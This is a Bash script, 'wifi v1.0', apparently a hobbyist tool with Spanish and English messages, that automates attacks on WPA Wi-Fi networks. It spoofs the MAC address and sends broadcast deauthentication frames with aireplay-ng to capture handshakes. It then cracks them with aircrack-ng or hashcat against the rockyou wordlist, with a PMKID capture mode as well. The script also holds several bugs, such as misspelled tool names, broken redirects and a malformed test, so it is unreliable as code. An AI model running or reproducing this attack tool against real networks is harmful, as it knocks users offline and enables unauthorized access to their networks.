#!/bin/bash
# wifi v1.0, Author @4xeL

# Colours
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
greenColour="\e[0;32m\033[1m"
yellowColour="\e[0;33m\033[1m"
blueColour="\e[0;34m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

# Variables Globales
export DEBIAN_FRONTEND=noninteractive

# Funciones

# fucion ctrl_c    ///Para rederigir el flugo si quiero  cerrar el programa.
function ctrl_c (){
    echo -e "\n${redColour}[!]exit to program...\n${endColour}"
    tput cnorm; airmon-ng stop ${wifi_card}mon > /dev/null 2>&1
    rm Capture* 2/dev/null

    exit 0
}

# help panel
function help_panel(){
    echo -e "\n${redColour}[!]ejecutar: ./wifi.sh\n${endColour}"
    for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}"
    echo -e "\n\n\t${blueColour}[-a] ${endColour}${yellowColour}Attack Mode${endColour}"
    echo -e "\t\t${purpleColour}Handshake${endColour}${turquoiseColour}:\t Handshake mode${endColour}"
    echo -e "\t\t${purpleColour}PKMID${endColour}${turquoiseColour}:\t\t\t PKID mode${endColour}"
    echo -e "\n\t${grayColour}[-n] ${endColour}${yellowColour}Wifi Cadrd${endColour}"
    echo -e "\n\t${grayColour}[-h] ${endColour}${yellowColour}Help\n${endColour}"
    tput cnorm; exit 1
}

function start_attack(){
    clear
    echo -e "${blueColour}[*]${endColour}${greenColour}Configurando la tarjeta...${endColour}\n"
    airmon-ng start $wifi_card > /dev/null 2>&1
    ifconfig ${wifi_card}mon down && macchanger -a ${wifi_card}mon > /dev/null 2>&1
    ifconfig ${wifi_card}mon up; killall dhclient wpa_supplicant 2/dev/null 2


    if [[ "$(echo $attack_mode)" == "Handshake" ]]
    then
        
        echo -e "${yellowColour}[*]${endColour}${greenColour}New Mac Asignement${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${wifi_card}mon | grep -i current | xargs | cut ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
        
        xterm -hold -e "airdump-ng ${wifi_card}mon" &

        airdump_xterm_PID=$!
        
        echo -ne "\n${blueColour}[*]${endColour}${greenColour}Name Access Point: ${endColour}\n" && read apName
        echo -ne "\n${blueColour}[*]${endColour}${greenColour}Name Channel Access Point: ${endColour}\n" && read apChannel

        kill -9 $airdump_xterm_PID
        wait airdump_xterm_PID 2>/dev/null

        xterm -hold -e "airdump-ng -c $apChannel -w Capture --essid $apName ${wifi_card}mon" &
        airdump_filter_xterm_PID=$!

        sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${wifi_card}mon" &
        aireplay_xterm_PID=$!
        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

        sleep 10; kill -9 $airdump_filter_xterm_PID; wait $airdump_filter_xterm_PID 2>/dev/null

        xterm -hold -e "aircrack-ng -w /usr/share/wordlist/rockyou.txt Capture-01.cap" &
    
    elif [[ "$(echo $attack_mode)" == "PKMID" ]]
    then
        clear
        echo -e "${yellowColour}[*]${endColour}${greenColour}Initializing PKMID attack${endColour}"
        sleep 2
        timeout 60 bash -c "hcxdumptool -i ${wifi_card} --enable_status=1 -o Capture"
        echo -e "${yellowColour}[*]${endColour}${greenColour}Obteniendo Hasehes${endColour}"
        sleep 2
        hcxdumptool -z myHashes Capture; rm Capture 2/dev/null
        test -f myHashes

        if [[ "$(echo $?)" == "0"]]
        then
            echo -e "${yellowColour}[*]${endColour}${greenColour}Iniciando fuerza bruta${endColour}"
            sleep 2
            hashcat -m 16800  /usr/share/wordlist/rockyou.txt myHashes -d 1 --force
        else
            echo -e "${yellowColour}[*]${endColour}${greenColour}No capture Handshake${endColour}"
            sleep 2
        fi
    else
        echo -ne "${redColour}No es un ataque valido...${endColour}"
    fi

}

function dependencies(){
    tput civis
    clear
    dependencies=(aircrack-ng macchanger)

    echo -e "${blueColour}[!]${endColour}${greenColour}Install Programs nesesaries...${endColour}"
    sleep 2

    for program in "${dependencies[@]}"
    do
        echo -ne "${blueColour}[!]${endColour}${greenColour}Install Programs nesesaries${endColour}${purpleColour} $program${endColour}${blue}....${endColour}"
        
        test -f /usr/bin/$program

        if [[ "$(echo $?)" == "0"]]
        then
            echo -e " ${greenColour}(V)${endColour}"
        else
            echo -e " ${redColour}(X)${endColour}"
            echo -e "${blueColour}[!]${endColour}${greenColour}Install Programs${endColour}${purpleColour} $program${endColour}${blue}....${endColour}"
            apt-get install $program -y > /dev/null 2>&1
        fi; sleep 1
    done
    
}
# Main

if [[ "$(id -u)" == "0" ]]; then
    dependencies; declare -i parameter_counter=0 
    while getopts ":a:n:h:" opt; do
    case "$opt" in
        a) attack_mode=$OPTARG; let parameter_counter+=1;;
        n) wifi_card=$OPTARG; let parameter_counter+=1;;
        h) help_panel=$OPTARG;;
    esac
    done

    if [ $parameter_counter -ne 2 ]; then
        help_panel
    else
        dependencies #REVISAR
        start_attack
        tput cnorm; airmon-ng stop ${wifi_card}mon > /dev/null 2>&1
        rm Capture* 2/dev/null

    fi
    
else
        echo -e "\n${redColour}[-]No soy ROOT${endColour}\n"
fi
